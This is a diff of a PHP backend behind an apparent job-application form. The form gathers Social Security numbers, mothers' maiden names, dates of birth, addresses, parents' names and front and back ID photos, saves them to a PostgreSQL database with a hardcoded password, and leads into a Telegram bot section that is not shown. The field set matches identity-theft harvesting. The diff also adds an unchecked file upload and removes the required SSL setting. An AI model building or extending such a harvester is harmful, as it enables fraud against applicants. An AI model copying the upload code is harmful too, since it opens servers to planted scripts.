@@ -1,16 +1,6 @@
 <?php
-
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
 // ======================
-// CLOUDINARY CONFIG
-// ======================
-$cloudName = "dlddiquex";
-$uploadPreset = "job_forms";
-
-// ======================
-// NEON DB
+// NEON DATABASE (PostgreSQL)
 // ======================
 $host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
 $db   = "neondb";
@@ -18,7 +8,7 @@ $user = "neondb_owner";
 $pass = "npg_TQ1gBOwA9rCa";
 $port = "5432";
 
-$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";
+$dsn = "pgsql:host=$host;port=$port;dbname=$db";
 
 try {
     $pdo = new PDO($dsn, $user, $pass, [
@@ -29,99 +19,42 @@ try {
 }
 
 // ======================
-// VALIDATE INPUT (LIKE LARAVEL STYLE)
+// FORM DATA
 // ======================
-function clean($key) {
-    return $_POST[$key] ?? '';
+$first_name = $_POST['first_name'];
+$middle_name = $_POST['middle_name'];
+$last_name = $_POST['last_name'];
+$phone = $_POST['phone'];
+$email = $_POST['email'];
+$dob = $_POST['dob'];
+$mother_maiden = $_POST['mother_maiden'];
+$ssn = $_POST['ssn'];
+$birth_city = $_POST['birth_city'];
+$address_line1 = $_POST['address_line1'];
+$address_line2 = $_POST['address_line2'];
+$city = $_POST['city'];
+$state = $_POST['state'];
+$zip_code = $_POST['zip_code'];
+
+$address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;
+$father_name = $_POST['father_name'];
+$mother_name = $_POST['mother_name'];
+
+// ======================
+// FILE UPLOAD FUNCTION
+// ======================
+function uploadFile($file) {
+    if ($file['error'] == 0) {
+        $name = time() . "_" . basename($file['name']);
+        $target = "uploads/" . $name;
+        move_uploaded_file($file['tmp_name'], $target);
+        return $target;
+    }
+    return null;
 }
 
-$first_name = clean('first_name');
-$middle_name = clean('middle_name');
-$last_name = clean('last_name');
-$phone = clean('phone');
-$email = clean('email');
-$dob = clean('dob');
-$mother_maiden = clean('mother_maiden');
-$ssn = clean('ssn');
-$birth_city = clean('birth_city');
-
-$address_line1 = clean('address_line1');
-$address_line2 = clean('address_line2');
-$city = clean('city');
-$state = clean('state');
-$zip_code = clean('zip_code');
-
-$father_name = clean('father_name');
-$mother_name = clean('mother_name');
-
-$address = trim("$address_line1 $address_line2, $city, $state $zip_code");
-
-// ======================
-// CLOUDINARY UPLOAD (ROBUST VERSION)
-// ======================
-function uploadToCloudinary($file, $cloudName, $uploadPreset) {
-
-    if (!isset($file) || $file['error'] !== 0) {
-        return null;
-    }
-
-    // Laravel-like validation (MAX 5MB like your example)
-    if ($file['size'] > 5 * 1024 * 1024) {
-        return null;
-    }
-
-    $url = "https://api.cloudinary.com/v1_1/$cloudName/image/upload";
-
-    $postFields = [
-        'file' => new CURLFile($file['tmp_name']),
-        'upload_preset' => $uploadPreset,
-        'folder' => 'job_applications'
-    ];
-
-    $ch = curl_init();
-
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $url,
-        CURLOPT_POST => true,
-        CURLOPT_POSTFIELDS => $postFields,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 90,
-        CURLOPT_CONNECTTIMEOUT => 20
-    ]);
-
-    $response = curl_exec($ch);
-    $error = curl_error($ch);
-
-    curl_close($ch);
-
-    if ($error || !$response) {
-        error_log("Cloudinary error: " . $error);
-        return null;
-    }
-
-    $result = json_decode($response, true);
-
-    if (!isset($result['secure_url'])) {
-        error_log("Cloudinary invalid response: " . $response);
-        return null;
-    }
-
-    return $result['secure_url'];
-}
-
-// ======================
-// UPLOAD FILES (LIKE LARAVEL LOOP STYLE)
-// ======================
-$front_url = null;
-$back_url = null;
-
-if (isset($_FILES['front_id'])) {
-    $front_url = uploadToCloudinary($_FILES['front_id'], $cloudName, $uploadPreset);
-}
-
-if (isset($_FILES['back_id'])) {
-    $back_url = uploadToCloudinary($_FILES['back_id'], $cloudName, $uploadPreset);
-}
+$front_id = uploadFile($_FILES['front_id']);
+$back_id  = uploadFile($_FILES['back_id']);
 
 // ======================
 // SAVE TO DATABASE
@@ -142,9 +75,8 @@ $first_name, $middle_name, $last_name,
 $phone, $email, $dob, $mother_maiden,
 $ssn, $birth_city, $address,
 $father_name, $mother_name,
-$front_url, $back_url
+$front_id, $back_id
 ]);
-
 
 // ======================
 // TELEGRAM BOT SETUP
